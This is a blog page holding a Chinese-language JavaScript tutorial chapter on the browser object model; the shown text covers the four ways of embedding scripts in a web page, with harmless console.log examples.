
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      
      
        <meta name="author" content="Michael An">
      
      
        <link rel="canonical" href="https://michael18811380328.github.io/ebook-JS-basic/10-BOM/">
      
      <link rel="shortcut icon" href="../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.1.2, mkdocs-material-6.2.8">
    
    
      
        <title>10 BOM - Michale An Blog</title>
      
    
    
      <link rel="stylesheet" href="../../assets/stylesheets/main.cb6bc1d0.min.css">
      
        
        <link rel="stylesheet" href="../../assets/stylesheets/palette.39b8e14a.min.css">
        
          
          
          <meta name="theme-color" content="#2094f3">
        
      
    
    
    
      
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback">
        <style>body,input{font-family:"Roboto",-apple-system,BlinkMacSystemFont,Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono",SFMono-Regular,Consolas,Menlo,monospace}</style>
      
    
    
    
    
      
    
    
  </head>
  
  
    
    
    
    
    
    <body dir="ltr" data-md-color-scheme="" data-md-color-primary="blue" data-md-color-accent="">
      
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#bom" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
      

<header class="md-header" data-md-component="header">
  <nav class="md-header-nav md-grid" aria-label="Header">
    <a href="https://michael18811380328.github.io/" title="Michale An Blog" class="md-header-nav__button md-logo" aria-label="Michale An Blog">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 003-3 3 3 0 00-3-3 3 3 0 00-3 3 3 3 0 003 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg>

    </a>
    <label class="md-header-nav__button md-icon" for="__drawer">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg>
    </label>
    <div class="md-header-nav__title" data-md-component="header-title">
      <div class="md-header-nav__ellipsis">
        <div class="md-header-nav__topic">
          <span class="md-ellipsis">
            Michale An Blog
          </span>
        </div>
        <div class="md-header-nav__topic">
          <span class="md-ellipsis">
            
              10 BOM
            
          </span>
        </div>
      </div>
    </div>
    
      <label class="md-header-nav__button md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
      </label>
      
<div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" data-md-state="active" required>
      <label class="md-search__icon md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
      </label>
      <button type="reset" class="md-search__icon md-icon" aria-label="Clear" data-md-component="search-reset" tabindex="-1">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
      </button>
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
      <div class="md-header-nav__source">
        
<a href="https://github.com/Michael18811380328/Michael18811380328.github.io/" title="Go to repository" class="md-source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M439.55 236.05L244 40.45a28.87 28.87 0 00-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 01-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 000 40.81l195.61 195.6a28.86 28.86 0 0040.8 0l194.69-194.69a28.86 28.86 0 000-40.81z"/></svg>
  </div>
  <div class="md-source__repository">
    Michael18811380328/Michael18811380328.github.io
  </div>
</a>
      </div>
    
  </nav>
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    




<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="https://michael18811380328.github.io/" title="Michale An Blog" class="md-nav__button md-logo" aria-label="Michale An Blog">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 003-3 3 3 0 00-3-3 3 3 0 00-3 3 3 3 0 003 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg>

    </a>
    Michale An Blog
  </label>
  
    <div class="md-nav__source">
      
<a href="https://github.com/Michael18811380328/Michael18811380328.github.io/" title="Go to repository" class="md-source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M439.55 236.05L244 40.45a28.87 28.87 0 00-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 01-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 000 40.81l195.61 195.6a28.86 28.86 0 0040.8 0l194.69-194.69a28.86 28.86 0 000-40.81z"/></svg>
  </div>
  <div class="md-source__repository">
    Michael18811380328/Michael18811380328.github.io
  </div>
</a>
    </div>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="nav-1" type="checkbox" id="nav-1" >
      
      <label class="md-nav__link" for="nav-1">
        人生思考
        <span class="md-nav__icon md-icon"></span>
      </label>
      <nav class="md-nav" aria-label="人生思考" data-md-level="1">
        <label class="md-nav__title" for="nav-1">
          <span class="md-nav__icon md-icon"></span>
          人生思考
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../40%E9%80%80%E4%BC%91/" class="md-nav__link">
        40退休.md
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../Poor-and-busy/" class="md-nav__link">
        Poor-and-busy.md
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../Reflections%20on%20Pre-Tirement/" class="md-nav__link">
        Reflections on Pre-Tirement.md
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../The%20art%20of%20Execution%20%E6%89%A7%E8%A1%8C%E5%8A%9B%E7%9A%84%E8%89%BA%E6%9C%AF/" class="md-nav__link">
        The art of Execution 执行力的艺术.md
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../b%E8%AE%A1%E5%88%92/" class="md-nav__link">
        b计划.md
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../%E7%86%B5%E5%A2%9E/" class="md-nav__link">
        熵增.md
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../%E4%B8%AA%E4%BA%BA%E9%80%89%E6%8B%A9/" class="md-nav__link">
        个人选择.md
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../%E4%BA%BA%E7%94%9F%E7%9C%9F%E7%9B%B8/" class="md-nav__link">
        人生真相.md
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../%E4%B8%B9%E5%B0%BC%E6%96%AF%E4%B8%8EUnix/" class="md-nav__link">
        丹尼斯与Unix.md
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../%E8%A9%B9%E5%AE%8F%E5%BF%97%E8%AF%BB%E4%B9%A6/" class="md-nav__link">
        詹宏志读书.md
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../%E9%AA%A1%E5%AD%90%E5%92%8C%E4%BA%BA%E7%94%9F/" class="md-nav__link">
        骡子和人生.md
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../%E5%A6%82%E4%BD%95%E5%8F%98%E5%BE%97%E5%BC%BA%E5%A4%A7/" class="md-nav__link">
        如何变得强大.md
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../%E4%B8%93%E4%B8%9A%E6%95%99%E8%82%B2%E7%9A%84%E5%85%B4%E8%B5%B7/" class="md-nav__link">
        专业教育的兴起.md
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../%E4%B8%AD%E5%9B%BD%E7%BB%8F%E6%B5%8E%E7%9A%84%E8%BD%AC%E5%8F%98/" class="md-nav__link">
        中国经济的转变.md
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../%E7%A1%95%E5%A3%AB%E5%AD%A6%E4%BD%8D%E7%9A%84%E8%B4%AC%E5%80%BC/" class="md-nav__link">
        硕士学位的贬值.md
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../%E4%BB%BB%E6%AD%A3%E9%9D%9E%E7%9A%84%E7%AE%A1%E7%90%86%E6%80%9D%E6%83%B3/" class="md-nav__link">
        任正非的管理思想.md
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../%E6%8A%80%E6%9C%AF%E5%92%8C%E7%A8%B3%E5%AE%9A%E7%9A%84%E5%B7%A5%E4%BD%9C/" class="md-nav__link">
        技术和稳定的工作.md
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../%E5%A4%A7%E5%AD%A6%E6%95%99%E8%82%B2%E5%92%8C%E7%BD%91%E7%BB%9C%E6%96%87%E5%87%AD/" class="md-nav__link">
        大学教育和网络文凭.md
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE%E5%88%B0%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/" class="md-nav__link">
        思维导图到深度学习.md
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../%E5%B7%A5%E4%B8%9A%E6%96%87%E6%98%8E%E5%AF%B9%E4%BA%8E%E7%A4%BE%E4%BC%9A%E7%9A%84%E5%86%B2%E5%87%BB/" class="md-nav__link">
        工业文明对于社会的冲击.md
      </a>
    </li>
  

          
            
  
  
  
    <li class="md-nav__item">
      <a href="../../%E6%AD%A3%E6%80%81%E5%88%86%E5%B8%83%E5%92%8C%E5%AF%B9%E6%95%B0%E6%AD%A3%E6%80%81%E5%88%86%E5%B8%83/" class="md-nav__link">
        正态分布和对数正态分布.md
      </a>
    </li>
  

          
        </ul>
      </nav>
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    
<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#bom" class="md-nav__link">
    第十章 BOM
  </a>
  
    <nav class="md-nav" aria-label="第十章 BOM">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#101-bom" class="md-nav__link">
    10.1 BOM基本原理
  </a>
  
    <nav class="md-nav" aria-label="10.1 BOM基本原理">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_1" class="md-nav__link">
    概念
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#defer" class="md-nav__link">
    defer 属性
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#async" class="md-nav__link">
    async 属性
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_2" class="md-nav__link">
    加载协议
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_3" class="md-nav__link">
    浏览器组成
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_4" class="md-nav__link">
    重绘和重流
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_5" class="md-nav__link">
    性能优化
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#js" class="md-nav__link">
    JS 引擎
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#102-window" class="md-nav__link">
    10.2 window 对象
  </a>
  
    <nav class="md-nav" aria-label="10.2 window 对象">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_6" class="md-nav__link">
    属性
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_7" class="md-nav__link">
    方法
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_8" class="md-nav__link">
    事件
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_9" class="md-nav__link">
    多窗口操作
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#103-navigator" class="md-nav__link">
    10.3 Navigator
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#104-screen" class="md-nav__link">
    10.4  Screen
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#105-cookiea" class="md-nav__link">
    10.5 Cookie:a:
  </a>
  
    <nav class="md-nav" aria-label="10.5 Cookie:a:">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_10" class="md-nav__link">
    概述
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#cookie-http" class="md-nav__link">
    cookie 与 http
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_11" class="md-nav__link">
    属性
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#106-xmlhttpequesta" class="md-nav__link">
    10.6 XMLHttpequest:a:
  </a>
  
    <nav class="md-nav" aria-label="10.6 XMLHttpequest:a:">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_12" class="md-nav__link">
    概述
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_13" class="md-nav__link">
    实例属性
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_14" class="md-nav__link">
    实例方法
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_15" class="md-nav__link">
    实例事件
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#navigatorsendbeacon" class="md-nav__link">
    Navigator.sendBeacon()
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#107" class="md-nav__link">
    10.7 同源策略
  </a>
  
    <nav class="md-nav" aria-label="10.7 同源策略">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#same-origin" class="md-nav__link">
    Same-origin 介绍
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#cookie" class="md-nav__link">
    Cookie 共享
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#iframe" class="md-nav__link">
    iframe多窗口通信
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ajax" class="md-nav__link">
    Ajax 处理跨域
  </a>
  
    <nav class="md-nav" aria-label="Ajax 处理跨域">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#1jsonp" class="md-nav__link">
    1、JSONP
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#2websocket" class="md-nav__link">
    2、WebSocket
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#3cors" class="md-nav__link">
    3、CORS
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#108-cors" class="md-nav__link">
    10.8 CORS
  </a>
  
    <nav class="md-nav" aria-label="10.8 CORS">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#cors" class="md-nav__link">
    CORS概述
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_16" class="md-nav__link">
    简单请求
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_17" class="md-nav__link">
    非简单请求
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#109-storage" class="md-nav__link">
    10.9 Storage
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#109-history" class="md-nav__link">
    10.9 History
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#1010-location-url-urlsearchparems" class="md-nav__link">
    10.10 Location, URL, URLSearchParems 对象
  </a>
  
    <nav class="md-nav" aria-label="10.10 Location, URL, URLSearchParems 对象">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#location" class="md-nav__link">
    Location
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#url" class="md-nav__link">
    URL
  </a>
  
    <nav class="md-nav" aria-label="URL">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#1url" class="md-nav__link">
    1、URL的编码和解码
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#2url" class="md-nav__link">
    2、URL对象
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#3urlsearchparams" class="md-nav__link">
    3、URLSearchParams
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#1011-arraybuffer-blob" class="md-nav__link">
    10.11 ArrayBuffer, Blob
  </a>
  
    <nav class="md-nav" aria-label="10.11 ArrayBuffer, Blob">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#arraybuffer" class="md-nav__link">
    ArrayBuffer 对象
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#blob" class="md-nav__link">
    Blob 对象
  </a>
  
    <nav class="md-nav" aria-label="Blob 对象">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_18" class="md-nav__link">
    获取文件
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_19" class="md-nav__link">
    下载文件
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#url_1" class="md-nav__link">
    生成URL
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_20" class="md-nav__link">
    读取文件
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#1012-file-filelist-filereader" class="md-nav__link">
    10.12 File, FileList, FileReader
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#1013-formdata" class="md-nav__link">
    10.13 表单/FormData
  </a>
  
    <nav class="md-nav" aria-label="10.13 表单/FormData">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#form" class="md-nav__link">
    表单 form
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#formdata" class="md-nav__link">
    FormData 对象
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_21" class="md-nav__link">
    表单的内置验证
  </a>
  
    <nav class="md-nav" aria-label="表单的内置验证">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_22" class="md-nav__link">
    自动校验
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#checkvalidity" class="md-nav__link">
    checkValidity()
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#willvalidate" class="md-nav__link">
    willValidate 属性
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#validationmessage" class="md-nav__link">
    validationMessage 属性
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#setcustomvalidity" class="md-nav__link">
    setCustomValidity()
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#validity" class="md-nav__link">
    validity 属性
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#novalidate" class="md-nav__link">
    表单的 novalidate 属性
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#enctype" class="md-nav__link">
    enctype 属性
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_23" class="md-nav__link">
    文件上传
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#1014-indexeddb-api" class="md-nav__link">
    10.14 IndexedDB API
  </a>
  
    <nav class="md-nav" aria-label="10.14 IndexedDB API">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#1indexeddb" class="md-nav__link">
    1、IndexedDB
  </a>
  
    <nav class="md-nav" aria-label="1、IndexedDB">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_24" class="md-nav__link">
    出现原因
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_25" class="md-nav__link">
    特点
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_26" class="md-nav__link">
    分类
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#2idb" class="md-nav__link">
    2、IDB 基本操作
  </a>
  
    <nav class="md-nav" aria-label="2、IDB 基本操作">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#21" class="md-nav__link">
    2.1 打开数据库
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#22" class="md-nav__link">
    2.2 新建数据库
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#23" class="md-nav__link">
    2.3 新增数据
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#24" class="md-nav__link">
    2.4 读取数据
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#25" class="md-nav__link">
    2.5 遍历数据
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#26" class="md-nav__link">
    2.6 更新数据
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#27" class="md-nav__link">
    2.7 删除数据
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#28" class="md-nav__link">
    2.8 使用索引
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#3indexeddb-api" class="md-nav__link">
    3、indexedDB 对象 API
  </a>
  
    <nav class="md-nav" aria-label="3、indexedDB 对象 API">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#indexeddbopen" class="md-nav__link">
    indexedDB.open()
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#indexeddbdeletedatabase" class="md-nav__link">
    indexedDB.deleteDatabase()
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#indexeddbcmp" class="md-nav__link">
    indexedDB.cmp()
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#idbrequest" class="md-nav__link">
    IDBRequest 对象
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#idbdatabase" class="md-nav__link">
    IDBDatabase 对象
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#idb-object-store" class="md-nav__link">
    IDB Object Store 对象
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#idb-transaction" class="md-nav__link">
    IDB Transaction 对象
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#idbindex" class="md-nav__link">
    IDBIndex 对象
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#idbcursor" class="md-nav__link">
    IDBCursor 对象
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#idbkeyrange" class="md-nav__link">
    IDBKeyRange 对象
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#1015-web-worker" class="md-nav__link">
    10.15 Web worker
  </a>
  
    <nav class="md-nav" aria-label="10.15 Web worker">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_27" class="md-nav__link">
    概述
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_28" class="md-nav__link">
    基本用法
  </a>
  
    <nav class="md-nav" aria-label="基本用法">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_29" class="md-nav__link">
    主线程
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#worker" class="md-nav__link">
    Worker 线程
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#worker_1" class="md-nav__link">
    Worker 加载脚本
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_30" class="md-nav__link">
    错误处理
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#worker_2" class="md-nav__link">
    关闭 Worker
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_31" class="md-nav__link">
    数据通信
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#web-worker" class="md-nav__link">
    同页面的 Web Worker
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#worker_3" class="md-nav__link">
    实例：Worker 线程完成轮询
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#worker-worker" class="md-nav__link">
    实例： Worker 新建 Worker
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#api" class="md-nav__link">
    API
  </a>
  
    <nav class="md-nav" aria-label="API">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_32" class="md-nav__link">
    主线程
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#worker_4" class="md-nav__link">
    Worker 线程
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          <div class="md-content">
            <article class="md-content__inner md-typeset">
              
                
                  <a href="https://github.com/Michael18811380328/Michael18811380328.github.io/edit/master/docs/ebook-JS-basic/10-BOM.md" title="Edit this page" class="md-content__button md-icon">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20.71 7.04c.39-.39.39-1.04 0-1.41l-2.34-2.34c-.37-.39-1.02-.39-1.41 0l-1.84 1.83 3.75 3.75M3 17.25V21h3.75L17.81 9.93l-3.75-3.75L3 17.25z"/></svg>
                  </a>
                
                
                  <h1>10 BOM</h1>
                
                <h2 id="bom">第十章 BOM<a class="headerlink" href="#bom" title="Permanent link">&para;</a></h2>
<h3 id="101-bom">10.1 BOM基本原理<a class="headerlink" href="#101-bom" title="Permanent link">&para;</a></h3>
<h4 id="_1">概念<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h4>
<p>JS 代码嵌入网页有四种方法：</p>
<ul>
<li>script 嵌入内部代码，type = 'text/javascript' 说明脚本的类型。早期浏览器使用 'text/javascript' 新浏览器推荐使用 'application/javascript'。如果是其他参数，脚本不会执行（可以利用这个方法，传入其他信息，使用DOM方法获取脚本内容）</li>
<li>script 嵌入外部代码，设置 src 属性是外部的JS代码。如果内部外部同时使用，内部代码不会生效。script 脚本可以添加一个 integrity 属性，写入脚本的哈希签名，验证外部脚本的一致性，避免外部脚本篡改。</li>
<li>HTML 行内代码：事件触发后可以执行脚本 onclick='console.log('click');'</li>
<li>A 内部：<code>&lt;a href="javascript:console.log('Hello')"&gt;点击&lt;/a&gt;</code> 如果 JavaScript 代码返回一个字符串，浏览器就会新建一个文档，展示这个字符串的内容，原有文档的内容都会消失。</li>
</ul>
